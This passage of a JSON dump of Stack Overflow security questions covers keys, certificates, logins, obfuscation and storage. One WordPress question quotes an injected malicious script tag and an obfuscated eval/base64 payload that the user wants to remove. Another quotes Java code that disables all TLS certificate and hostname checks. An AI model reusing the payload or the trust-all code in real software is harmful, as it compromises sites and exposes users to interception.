(void)generateKeyPair:(NSUInteger)keySize;\n @end\n</code></pre>\n\n<p>Keypair.m</p>\n\n<pre><code>#import \"Keypair.h\"\n\n@implementation Keypair\n\nstatic const UInt8 publicKeyIdentifier[] = \"com.XXXXXXX.publickey\\0\";\nstatic const UInt8 privateKeyIdentifier[] = \"com.XXXXXXX.privatekey\\0\";\n\n+ (void)generateKeyPair:(NSUInteger)keySize {\n    OSStatus sanityCheck = noErr;\n    SecKeyRef publicKey = NULL;\n    SecKeyRef privateKey = NULL;\n    NSData *publicTag;\n    NSData *privateTag;\n\n    // Container dictionaries.\n    NSMutableDictionary * privateKeyAttr = [[NSMutableDictionary alloc] init];\n    NSMutableDictionary * publicKeyAttr = [[NSMutableDictionary alloc] init];\n    NSMutableDictionary * keyPairAttr = [[NSMutableDictionary alloc] init];\n\n    // Set top level dictionary for the keypair.\n    [keyPairAttr setObject:(__bridge id)kSecAttrKeyTypeRSA forKey:(__bridge id)kSecAttrKeyType];\n    [keyPairAttr setObject:[NSNumber numberWithUnsignedInteger:keySize] forKey:(__bridge id)kSecAttrKeySizeInBits];\n    [keyPairAttr setObject:[NSNumber numberWithBool:YES] forKey:(__bridge id)kSecAttrIsPermanent];\n\n    // Set the private key dictionary.\n    [privateKeyAttr setObject:[NSNumber numberWithBool:YES] forKey:(__bridge id)kSecAttrIsPermanent];\n    [privateKeyAttr setObject:privateTag forKey:(__bridge id)kSecAttrApplicationTag];\n    // See SecKey.h to set other flag values.\n\n    // Set the public key dictionary.\n    [publicKeyAttr setObject:[NSNumber numberWithBool:YES] forKey:(__bridge id)kSecAttrIsPermanent];\n    [publicKeyAttr setObject:publicTag forKey:(__bridge id)kSecAttrApplicationTag];\n    // See SecKey.h to set other flag values.\n\n    // Set attributes to top level dictionary.\n    [keyPairAttr setObject:privateKeyAttr forKey:(id)kSecPrivateKeyAttrs];\n    [keyPairAttr setObject:publicKeyAttr forKey:(id)kSecPublicKeyAttrs];\n\n\n    // SecKeyGeneratePair returns the SecKeyRefs just for educational purposes.\n    sanityCheck = SecKeyGeneratePair((__bridge CFDictionaryRef)keyPairAttr, &amp;publicKey, &amp;privateKey);\n    if(sanityCheck == noErr  &amp;&amp; publicKey != NULL &amp;&amp; privateKey != NULL)\n    {\n        NSLog(@\"Successful\");\n    }\n}\n\n@end\n</code></pre>\n"},{"tags":["security","iis7","certificates","x509certificate"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":9737,"score":2,"question_id":1503840,"title":"Convert certificate .pem to .der/.cer","body":"<p>I'm trying convert .pem to .cer using OpenSSL...</p>\n\n<pre><code>openssl x509 -inform PEM -in root.pem -outform DER -out root.cer\n</code></pre>\n\n<p>But, I don't know how to install the certificate on IIS 7.0 over Win Server 2008.</p>\n\n<p>I read some tutorials about it and tried to install the cert in IIS 7.0</p>\n\n<blockquote>\n  <p>Server Certificates -> complete certificate request -> </p>\n</blockquote>\n\n<p>The following error appears</p>\n\n<blockquote>\n  <p>Cannot find the certificate request associated with this certificate file. A certificate request must be completed on the computer where it was created.</p>\n</blockquote>\n\n<p>The installation of the certificate to IIS fails.</p>\n\n<p>Any suggestions on how to proceed installing the .cer in IIS 7?</p>\n"},{"tags":["php","html","security","login","code-injection"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13102543,"title":"PHP Account Security","body":"<p>Currently I have a site that hides the account window where you can change password, upload files, etc. The code is simple as:<br></p>\n\n<pre><code>&lt;?php if($is_logged_in) { ?&gt;\n      &lt;div id=\"account_window\"&gt;\n          //stuff\n      &lt;/div&gt;\n&lt;?php } ?&gt;\n</code></pre>\n\n<p>But according to <a href=\"http://stackoverflow.com/questions/13095387/php-admin-account\">this</a> that's a big security flaw. So what is the alternative? How can I make the account window viewable only if the user has logged in and do it in a more secure manner that is not susceptible <code>if someone just injects the right HTML into the page</code>?</p>\n"},{"tags":["javascript","security","closures"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":13101968,"title":"Private variables and closures","body":"<p>As <em>Douglas Crockford</em> says we can have private properties using closures in JavaScript and they are very handy to handle secure data. </p>\n\n<p>Now I understand the concept of Encapsulation, as it helps us to manage and structure the code . Even private variables are useful for performance, eg: you can cache DOM elements, properties and global variables for iterative access. </p>\n\n<p>So the question is: <strong>How exactly closures or private variables help us in handling the sensitive data?</strong> </p>\n"},{"tags":["java","android","security","proguard"],"answer_count":3,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":74,"score":6,"question_id":13101727,"title":"Obfuscation: hide hardcoded values in java","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4427238/hiding-strings-in-obfuscated-code\">hiding strings in Obfuscated code</a>  </p>\n</blockquote>\n\n\n\n<p>I'm trying to hide a little some static Strings of my app in order to make it harder to decompile, this way like the constants like cipher algorithms names are harder to find in the obfuscated code.</p>\n\n<p>I've considered things like:</p>\n\n<pre><code>String CONCAT= \"concat\"+\"string\";\nString RAW_STRING= \"raw_string\";\nString FROM_BYTES=new String(\"from_bytes\".getBytes());\nString FROM_CHARS=new String(new char[]{'f','r','o','m','_','c','h','a','r','s'});\nString FROM_CHAR2=new String(new char[]{102,114,111,109,95,99,104,97,114,115,95,50});\n</code></pre>\n\n<p>And the last two options seems to be \"darker\" than the  raw option but I imagine there are better ways for doing this.</p>\n\n<p>How can I improve this? Thanks </p>\n"},{"tags":["php","mysql","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13101675,"title":"php and mysql login script error","body":"<p>I've made a php login script and it just not works.</p>\n\n<p>my code :</p>\n\n<pre><code>&lt;?php\n\nfunction clean($str) { /* sanatize strings for databases &amp; security */\n  $str = trim($str);\n    if(get_magic_quotes_gpc()) {\n        $str = stripslashes($str);\n    }\n    return mysql_real_escape_string($str);\n}\n\nif (!empty($_POST['login_admin'])) {\n\n    $username = clean($_POST['name']);\n    $password = clean($_POST['password']);\n\n      try {\n        $dbh = new PDO('mysql:host=localhost;dbname=imedia', \"imedia\", \"imedia\");\n\n        $statement = $dbh-&gt;prepare(\"SELECT * FROM administratori WHERE username =:username AND parola =:password\");\n        $statement-&gt;execute(array(\":username\" =&gt; $username, \":password\" =&gt; md5($password)));\n        $row = $statement-&gt;fetch();\n        if ($row) {\n            session_start(\"imedia_admin\");\n            $_SESSION['imedia_admin']['logname'] = $row['username'];\n            $_SESSION['imedia_admin']['password'] = $row['password'];\n            echo json_encode(\"success\");\n        } else {\n            echo json_encode(\"error\");\n        }\n\n        $dbh = null;\n    } catch (PDOException $e) {\n        print \"Error!: \" . $e-&gt;getMessage() . \"&lt;br/&gt;\";\n        die();\n    }\n}\n?&gt;\n</code></pre>\n\n<p>problem is in <code>clean</code> function, if a do not use it, my code works, can anybody explain me what i am doing wrong please ?</p>\n"},{"tags":["php","security","smtp","gmail","pear"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13101072,"title":"Is sending from gmail via pear secure?","body":"<p>I'm using a form on my website to send an email using the PEAR mail function. The email will send via gmail as described here - <a href=\"http://www.phpmaniac.net/wiki/index.php/Pear_Mail\" rel=\"nofollow\">http://www.phpmaniac.net/wiki/index.php/Pear_Mail</a></p>\n\n<p>I will therefore need to include something like the:</p>\n\n<pre><code>&lt;?php\n$smtp_params[\"host\"]     = \"smtp.gmail.com\";\n$smtp_params[\"port\"]     = \"25\";\n$smtp_params[\"auth\"]     = true;\n$smtp_params[\"username\"] = \"user@gmail.com\";\n$smtp_params[\"password\"] = \"pass\";\n?&gt;\n</code></pre>\n\n<p>Is it secure to put my username and password in the script like that? Obviously you wouldn't be able to see server-side script like this using 'View Source', but could you grab the source files via a web clipper or something and read the script that way? Thanks</p>\n"},{"tags":["security","webserver","lockfile"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13098680,"title":"Ensuring security of my files at web server","body":"<p>I have hosted my website on a shared web-hosting server. However, I am worried about the security of the files that I have kept on the server. Admins of web-hosting service keep on changing the contents of my cron jobs etc. by their own. I am worried if they change my files also some day.</p>\n\n<p>Is there any way to lock my folders on web-server so that no one else can have access to it as we have folder-locker in Windows.</p>\n\n<p>Any other suggestions are also welcomed in this regard.</p>\n\n<p>Thanks !</p>\n"},{"tags":["php","security","upload","system","picture"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":13098321,"title":"How to Secure php picture upload system","body":"<p>I want to make picture upload system with php and i want users will be able to upload just \npng,jpg files and not viruses or other files. how can i do this?</p>\n"},{"tags":["html","database","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13098517,"title":"Is it good to place Database values inside hidden elements for later use in HTML","body":"<p>I'm using an approach but I don't know if it's wrong.</p>\n\n<p>When I connect to the database in my website, the ResultSet will return the \"Username\" and the \"UserId\".</p>\n\n<pre><code>while(rset.next()) {\n//I place the Username inside a DIV, which is visible\n//I Place the UserId inside another Div, which is not visible\n}\n</code></pre>\n\n<p>I place the UserId because I need to grab them later for jquery and Ajax requests, when I view the source code, those UserIds are visible in the source code.</p>\n\n<p>Means anyone can know the id of the listed users, or any other thing that has an id, does this weaken the website's security? </p>\n"},{"tags":["security","windows-8","microsoft-metro"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":43,"score":-2,"question_id":13097590,"title":"Windows 8 - Prevent from remembering password in Email app","body":"<p>I've just upgraded from Windows 7 to Windows 8, so far so good.</p>\n\n<p>I've just added my email accounts and so will do the other members of my family.</p>\n\n<p>Is there a way to prevent remembering the username/password so when we open the metro Email app it prompts for username and password each time ?</p>\n\n<p>We used to use only one user account on windows 7 and I don't want to create additional accounts just for the sake of each member checking his own emails in his session (this is the only solution I've seen so far).</p>\n\n<p>Thanks !</p>\n\n<p>Charles</p>\n"},{"tags":["php","apache","security","http","authentication"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13097214,"title":"PHP + Apache Basic HTTP authentication/limit users to specific directories","body":"<p>I'd like to have logged in users access to certain directories only. For example, have the following directory structure:</p>\n\n<blockquote>\n  <p>/stuff/user-a/pic.jpg</p>\n  \n  <p>/stuff/user-b/file.doc</p>\n</blockquote>\n\n<p>I'd like Apache to only give user-a access to <code>/stuff/user-a</code> and give a 403 if he tries to reach <code>/stuff/user-b</code></p>\n\n<p>Now, I've been reading and it seems to be possible to do this with REMOTE_USER and mod_rewrite. Which will make it even better, as i could rewrite it as <code>/stuff -&gt; /stuff/$REMOTE_USER</code></p>\n\n<p>The problem is, I don't want the ugly browser popup. My PHP application already has a login form and a session. From what I've been reading, it is possible to use basic HTTP authentication as an auth method for PHP (to login as <a href=\"http://user:pass@stackoverflow.com\" rel=\"nofollow\">http://user:pass@stackoverflow.com</a>). But the opposite (passing a web form to the HTTP authentication) doesn't seem to be possible. </p>\n\n<p>I would also like to avoid using something as mod_xsendfile, as I'd rather not use any \"proxy\" scripts to handle this, and let Apache take care of access.</p>\n"},{"tags":["java","security","https"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13076511,"title":"Security risks in disabling SSL certification for Java program","body":"<p>Our team crawls websites to keep our info up to date. I was running into <a href=\"http://stackoverflow.com/questions/13073285/response-failing-over-https-in-java/13073621#13073621\">security exceptions when crawling HTTPS pages</a>. The issue was that Java had an issue accepting self signed certificates from pages.</p>\n\n<p>Rather than keeping a list of certificates to accept (which could be difficult to maintain in the future), I'm using the work around provided by neu242 to <a href=\"http://stackoverflow.com/questions/875467/java-client-certificates-over-https-ssl\">disable SSL certification validation</a>.</p>\n\n<pre><code>public static void disableCertificateValidation() \n{\n    // Create a trust manager that does not validate certificate chains\n      TrustManager[] trustAllCerts = new TrustManager[] { \n        new X509TrustManager() {\n          public X509Certificate[] getAcceptedIssuers() { \n            return new X509Certificate[0]; \n          }\n\n\n        @Override\n        public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException\n        {\n            // TODO Auto-generated method stub\n\n        }\n        @Override\n        public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException\n        {\n            // TODO Auto-generated method stub\n\n        }\n      }};\n\n      // Ignore differences between given hostname and certificate hostname\n      HostnameVerifier hv = new HostnameVerifier() {\n\n        @Override\n        public boolean verify(String arg0, SSLSession arg1)\n        {\n            // TODO Auto-generated method stub\n            return true;\n        }\n      };\n\n      // Install the all-trusting trust manager\n      try {\n        SSLContext sc = SSLContext.getInstance(\"SSL\");\n        sc.init(null, trustAllCerts, new SecureRandom());\n        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\n        HttpsURLConnection.setDefaultHostnameVerifier(hv);\n      } catch (Exception e) {}\n}\n</code></pre>\n\n<p>Of course, this is posing a significant security risk. However, if I'm only using this code with my downloading program (the program which downloads images and pdf docs), and I'm not using the program to send any sensitive information, what security risks exist? From what I understand, this trust manager will be set only for the running JVM (the server running the program won't disable cert validation at the OS level). Further, if my requests for the images and docs were intercepted, my code will try to form the response into an image or pdf, respectively, and won't launch any malicious software. Is there a security risk I'm missing somewhere?</p>\n"},{"tags":["javascript","html","database","security","privacy"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":16,"score":2,"question_id":13082526,"title":"How to pass table record identifier to client side","body":"<p>In a CRUD environment, let say we are displaying list of user's contacts. Web site needs to provide \"Edit\" and \"Delete\" functionality to user. Each contact represents a record in database table, and identifier of a record must be passed to browser (client).</p>\n\n<p>In my applications, I normally have an auto increment identifier field in table and I pass its value to browser. So when user wants to edit or delete, I send request to server together with that identifier. In that way I can find the record in table.</p>\n\n<p>But I am worried about security and privacy. Normally I do not allow any other user to access someone else's record (Duh), though still do not like passing just an integer number to browser.</p>\n\n<p>AFAIK, big companies are providing a long unique identifier like 40F0C923BACECBF40C4CAA465D0E4DB0 to do this, but this time I will need to check if that value is used before every time I create a new record.</p>\n\n<p>I didn't know where to ask this question to Database section or here, and just asked here.\nHow do you guys manage to do this? or in other words, how it is done professionally?</p>\n"},{"tags":["php","security","cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":3,"view_count":40,"score":-1,"question_id":13092186,"title":"How to make a login system like that of facebook","body":"<p>I have a enquiry, now this was a serious brainstorming problem for me. Do one thing at first, go to m.facebook.com from your phone, then login, then login from a computer and change the password from that computer, while changing the password, you are asked weather or not to deauthenticate the device that you are previously logged in with. if you choose keep them logged in, then again open fb from phone, then you don't need to login again, now the question is HOW? Because if fb don't store the hashed password in the cookie, then what does it store and yet it is secured? Anyone know about this login authentication system?</p>\n"},{"tags":["wordpress","security","virus"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":13093482,"title":"A link to a linkstoads.net in my wordpress blog, probably a virus. How do i get rid of it?","body":"<p>Recently (last 2 weeks) this line of code appeared in the footer of a wordpress blog :</p>\n\n<pre><code>&lt;script type=\"text/javascript\" src=\"http://linkstoads.net/keller/link.php?id=3\" name=\"linkstats\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>I did not put that here. I have no idea about what it does ; but I want it out.</p>\n\n<p>For my first try, I just replaced the template and it was gone for a few minutes. But it came back.</p>\n\n<p>So i got to my index.php file (not the template, the very first index.php) and found that code :</p>\n\n<pre><code>#c3284d#\neval(gzinflate(base64_decode(\"JcxLDoMwDEXROVL3EHkBeMCsfLqRTKxgKYE0WLFVtbsvkOnRe5dDPBxMGmoSc/YTnj0Yfw03+lBjD05rOD2ayRMxp7KrHbRqX9hw55y53tpLlFda5+G8FHpfrTYmUw/LhC24wPjo/g==\")));\n#/c3284d#\n</code></pre>\n\n<p>So I removed it, but it came back again the next day.</p>\n\n<p>How is that possible ? I'm a newbie about viruses and security, so the answer may be really basic.</p>\n"},{"tags":["security","testing"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":7936222,"title":"WebInspect on Production Systems","body":"<p>I have a client who has been using WebInspect on live production systems with live data.  They give the tool a real life user id with real life data, and let WebInspect have at it with full bore form filling.  In at least one case they have damaged production data as a result.  My client is adamant that they have to do this to insure that their website is secure.  To me this seems like an ill-conceived idea.  What are other people's opinions of this?  I've always thought of WebInspect as a developer's tool not a penetration testing tool.</p>\n"},{"tags":["javascript","security","pubnub"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12932427,"title":"Secure PUBNUB doesnt fire callback","body":"<p>pubnub = PUBNUB.secure({</p>\n\n<pre><code>     subscribe_key : \"#{config.subscribe_key}\",\n     publish_key   : \"#{config.publish_key}\",\n     origin        : 'pubsub.pubnub.com',\n     ssl           : true,\n     cipher_key    : \"#{config.publish_key}\"\n  });\n</code></pre>\n\n<p>pubnub.subscribe({</p>\n\n<pre><code>    restore  : true,\n    channel  : 'broadcast',\n    callback : function(data) {\n      debugger;\n      new_message_notification(data);\n    }\n  });\n</code></pre>\n\n<p>Callback is not working, but I see responses in NETWORK tab in browser.\nWhere is the problem?</p>\n"},{"tags":["java","android","security"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":13093817,"title":"Secure database storage in Android","body":"<p>I'm implementing the in-app-billing system for my app and (as the documentation advices) I'd like to add some encryption system to the database.</p>\n\n<p>I've tested <a href=\"https://guardianproject.info/code/sqlcipher/\" rel=\"nofollow\">SQLCipher</a>, I liked it but since it need to override all the classes at <code>android.database.sqlite.*</code> your app loses the connection to that part of the SDK, losing possible important future updates and depending on the developer (or yourself since is opensource).</p>\n\n<p>Other solution I've considered is to add a extra column in the <code>sensible</code> tables storing there a value (unique for each device), and then ignore the data that don't contain that key. But this method is clearly more weak.</p>\n\n<p>How can I improve the security without using SQLCipher? Thanks</p>\n"},{"tags":["security","salesforce","cloud","crm"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":12822924,"title":"salesforce - report permission issue data missing","body":"<p>Depending on the user, report data is missing when viewed via the dashboard. </p>\n\n<p>-In security settings I gave organization-wide read/write permission.<br>\n-The reports are based on a two custom data objects with a master/child relationship (which is also set as read/write.) </p>\n\n<p>-The report folder is also set as \"read/write\" and all users have permission.</p>\n\n<p>Anything else that I forgot to check?</p>\n\n<p>Thanks!</p>\n"},{"tags":["security","postgresql"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13087084,"title":"insecure defaults with postgres public schema?","body":"<p>the question comes basically down to this: how can i securely create new databases on postgres, meaning that by default nobody has any privileges on new databases and all access must be explicitly defined.</p>\n\n<p>i tried various resources in the internet but can not get a clear answer. i tried this on fedora 17 linux with postgres 9.1, but eventually would use it on redhat 6.3 with postgres 8.4.</p>\n\n<p>the process:</p>\n\n<ol>\n<li>install postgres, run initdb, start server</li>\n<li>connect locally with postgres super user</li>\n<li>create new user u1 with options createdb and createrole</li>\n<li>disconnect and reconnect as u1</li>\n<li>create database db1</li>\n<li>create user u2</li>\n<li>disconnect and reconnect as u2</li>\n<li>create table t1 in db1</li>\n</ol>\n\n<p>i would not expect that last step to succeed. u2 has not been given any privileges on db1 and also no privileges show up when querying the database or schema. to my understanding u2 can create tables on db1, because of the public schema and the default privileges for the build-in public role. if i want to revoke them i can only do so on the database but not on the schema, because that is owned by postgres. so eventually i have to revoke those privileges with a super user for every new database i make. i can not delegate it to the owner of the database and also i must not forget to do it for every new database.</p>\n\n<p>the default would allow every user to spam the public schema in any new database. this is dangerous because other users may by default work on the public schema and not check that tables are already there and just use the existing ones owned by some stranger.</p>\n\n<p>how can i fix these insecure defaults?</p>\n"},{"tags":["c#",".net","wcf","security","data-transfer"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13091606,"title":"secure file transfer over the internet","body":"<p>What is the best way to transfer files (secure data) over the internet? I am thinking about WCF REST services. The file size is less than 10MB.  Our company do not allow FTP transfer. Could you please suggest if there are any articles or third party tools? I appreciate any suggestions.  </p>\n"},{"tags":["java","security","authentication"],"answer_count":5,"favorite_count":7,"up_vote_count":17,"down_vote_count":0,"view_count":540,"score":17,"question_id":12937641,"title":"Handling passwords used for auth in source code","body":"<p>Assuming that I'm trying to pull from a RESTful api that uses basic authentication / basic certificates, what would be the best way to store that user name and password in my program?   Right now it's just sitting there in plaintext.</p>\n\n<pre><code>UsernamePasswordCredentials creds = new UsernamePasswordCredentials(\"myName@myserver\",\"myPassword1234\");\n</code></pre>\n\n<p>Is there some way of doing this that is more security minded?</p>\n\n<p>Thanks</p>\n"},{"tags":["java","security","java-ee","pki"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13035276,"title":"PKI baked into J2EE application","body":"<p>This community has been extremely helpful in education of various nuances with PKI. I do have a question of baking PKI support within applications. </p>\n\n<p>How do I bake PKI support within a JAVA application. I understand we have dogtag and EBJCA but that is geared towards the complete infrastructure setup. I need the ability to allow my application to use PKI - whether ours or the clients. </p>\n\n<p>How do you folks do this ?</p>\n"},{"tags":["java","android","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13089070,"title":"Unique (device based) salt in Android","body":"<p>I'm implementing the Google's licensing system and for the obfuscator I need to generate a unique id. The documentation says </p>\n\n<pre><code>/**\n * @param salt an array of random bytes to use for each (un)obfuscation\n * @param applicationId application identifier, e.g. the package name\n * @param deviceId device identifier. Use as many sources as possible to\n *    create this unique identifier.\n */\npublic AESObfuscator(byte[] salt, String applicationId, String deviceId) {\n</code></pre>\n\n<p>In addition to the packagename and the device id obtained with </p>\n\n<pre><code>private String android_id = Secure.getString(getContext().getContentResolver(),\n                                                    Secure.ANDROID_ID); \n</code></pre>\n\n<p>what other sources can I use? </p>\n\n<p>Thanks</p>\n"},{"tags":["android","security","screenshot","ice-cream-sandwich"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":643,"score":1,"question_id":9257210,"title":"Disable screenshots in android ics","body":"<p>For one of our secure apps, there is a requirement to disable the screenshot capability for the app in Android ICS. Is this possible on a non-rooted device?<br>\nThanks,<br>\nRajath</p>\n"},{"tags":["security","authentication","random"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":27,"score":0,"question_id":13085021,"title":"When requesting a user to enter specific characters from a password, should I sort them before?","body":"<p>I have a function which takes the size of a String and randomly chooses X amount of positions from the String. It generates an array eg. [4,1,3,9]. </p>\n\n<p>Should I be sorting this before asking the user to enter the corresponding characters from their password? Eg. [1,3,4,9]. </p>\n\n<p>The benefit is usability, but I'm concerned I may be losing security by limiting the choice of characters. If I sort it, the first position requested from the user would never be the last character from the password, for example. </p>\n\n<p>Not sure if this matters at all. Thanks</p>\n"},{"tags":["java","android","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":72,"score":-4,"question_id":13082841,"title":"Is there a way to securely store files on an Android device?","body":"<p>I want to store downloaded files securely on Android device and I don't want to use encryption. How can I do it?</p>\n\n<p>Can i use <a href=\"http://developer.android.com/reference/android/content/Context.html#getDir%28java.lang.String,%20int%29\" rel=\"nofollow\">Context.getDir()</a> with MOD_PRIVATE to do it ? why not ?</p>\n"},{"tags":["web-services","spring","security","kerberos","spnego"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":13054049,"title":"Is it possible to use Spring Security – Kerberos Extension to make soap calls to Kerberos protected service?","body":"<p>Is it possible to use Spring Security – Kerberos Extension to make soap calls to Kerberos protected service ? We have Wss4jSecurityInterceptor for Spring-ws , but if the soap client want to send kerberos token , we don;t have any kerberosSecurityInterceptor ? Is there a way to do this using Spring Security – Kerberos Extension? Please advise?</p>\n"},{"tags":["java","security","applet","web-security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":75,"score":-1,"question_id":13082178,"title":"Bypass alert \"Do you want to run this application\"","body":"<p>Is there any way to convert <strong>self signed certificate to trusted</strong> one? </p>\n\n<p>So can I by pass below alert?</p>\n\n<p><img src=\"http://i.stack.imgur.com/0OKKR.png\" alt=\"enter image description here\"></p>\n\n<p>I have one applet which trying to run some application on user's machine. </p>\n\n<p>I am using self signed jar.</p>\n"},{"tags":["sql","security","sql-injection","prepared-statement"],"answer_count":7,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":871,"score":5,"question_id":8263371,"title":"How prepared statements can protect from SQL injection attacks?","body":"<p>How <a href=\"http://en.wikipedia.org/wiki/Prepared_statement\"><code>prepared statements</code></a> can protect from <a href=\"http://en.wikipedia.org/wiki/SQL_injection\"><code>SQL injection</code></a> attacks?</p>\n\n<p>Wikipedia says:</p>\n\n<blockquote>\n  <p>Prepared statements are resilient against SQL injection, because\n  parameter values, which are transmitted later using a different\n  protocol, need not be correctly escaped. If the original statement\n  template is not derived from external input, SQL injection cannot\n  occur.</p>\n</blockquote>\n\n<p>But I can not see the reasons well, can any one kindly give a simple explanation with easy english (english is not my native lang) and some examples?</p>\n"},{"tags":["actionscript-3","security","air","flash-builder","sandbox"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":723,"score":3,"question_id":6333239,"title":"execute remote SWF in AIR Security Sandbox","body":"<p>I try to download an external SWF and run it within the AIR security sandbox.</p>\n\n<p>this is the code of the AIR application:</p>\n\n<pre><code>public class Downloader extends Sprite\n{\n\n    private static const REMOTE_FILE:URLRequest = new URLRequest(\"http://myserver.com/downloadable.swf\");\n    private var _main:NativeWindow;\n\n    public function Downloader()\n    {\n        var loader:URLLoader = new URLLoader(REMOTE_FILE);\n        loader.dataFormat = URLLoaderDataFormat.BINARY;\n        loader.addEventListener(Event.COMPLETE, downloadComplete);\n    }\n\n    private function downloadComplete(e:Event):void{\n        var ba:ByteArray = e.target.data;\n        var stream:FileStream = new FileStream();\n        var file:File = File.applicationStorageDirectory.resolvePath(\"downloadable.swf\");\n        stream.open(file, FileMode.WRITE);\n        stream.writeBytes(ba);\n        stream.close();\n\n        loadAndRunSwf();\n    }\n\n    private function loadAndRunSwf(){       \n        this._main = new NativeWindow();\n        this._main.width = 1024;\n        this._main.height = 768;\n\n                    ////obsolete?\n        //var context:LoaderContext = new LoaderContext();\n        //context.allowLoadBytesCodeExecution = true;\n        //context.applicationDomain = ApplicationDomain.currentDomain;  \n\n        var file:File = File.applicationStorageDirectory.resolvePath(\"downloadable.swf\");\n        var loader:Loader = new Loader();\n        loader.load(new URLRequest(file.url)/*,context*/);\n\n        this._main.stage.addChild(loader);\n        this._main.activate();\n    }\n}\n</code></pre>\n\n<p>Code of the downloadable.swf:</p>\n\n<pre><code>public class Downloadable extends Sprite\n{\n    private var _btn:Button = new Button();\n    private var _baseFolder:File = new File(\"app-storage:/\");\n\n    public function downloadable_test()\n    {\n        this.addChild(_btn);\n        _btn.label = \"access Harddisk\";\n                    ...\n    }\n}\n</code></pre>\n\n<p>so now, If I run Downloader, it will download the swf and try to run it, but i'll get an exception in Downloadable on the line</p>\n\n<pre><code>    private var _baseFolder:File = new File(\"app-storage:/\");\n</code></pre>\n\n<p>the error:</p>\n\n<pre><code>SecurityError: file\nat runtime::SecurityManager$/checkPrivilegeForCaller()\n</code></pre>\n\n<p>So - what Do I need to do to prevent such security errors? I want my remote SWF to be treated as native code running in the same security sandbox as the AIR code.</p>\n"},{"tags":["security","geolocation","location"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13080307,"title":"Location of Azure Servers","body":"<p>There are certain legal restrictions on the ability of a business to transfer an individual's personal information outside Australia.  Am I right in understanding that there is no data centre in Australia and therefore in all cases my data will be transferred outside Australia?\nIf this is the case, can I chose the geo-location?  If not, is there some statement I could make in my Terms as to where that data would/might be stored?  EG. \"in any one of Windows Azure's global Data Centres\", or \"in their South East Asian Data Centre\".  I could imagine that uncertainty my clients have about the location of a server/data might be an added security feature in itself (in that Windows does not disclose the location).\nKind Regards</p>\n"},{"tags":["windows","security","regedit"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13078984,"title":"Windows Registry access denied when administrator","body":"<p>Windows 7 workstation, \nLaunch '<em><code>regedit.exe</code></em>' as 'Administrator'</p>\n\n<p>Find the following registry key:</p>\n\n<pre><code>HKEY_CLASSES_ROOT\\CLSID{76A64158-CB41-11D1-8B02-00600806D9B6}\n</code></pre>\n\n<p>Right click and select 'Permissions'\nChange owner to administrators group.\nChange permissions for administrators group. Grant Full Control.\nI get an error saying: </p>\n\n<blockquote>\n  <p>unable to save permission, access denied</p>\n</blockquote>\n\n<p>Why do get access denied when I run as administrator?</p>\n"},{"tags":["security","iis","iis-7.5","isapi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":13061349,"title":"IIS 7.5 ISAPI Application Pool Security","body":"<p>I'm running an ISAPI dll under IIS 7.5, and wish to use Bill Egge's ISAPI Loader dll so an updated dll can be swapped out without stopping the server.</p>\n\n<p>If I set the security on the directory holding the DLL to \"everyone\" with \"full control\" then it works as designed (a dll with an *.update extension automatically causes the existing *.run dll to be backed up, and the new dll to be renamed with the *.run 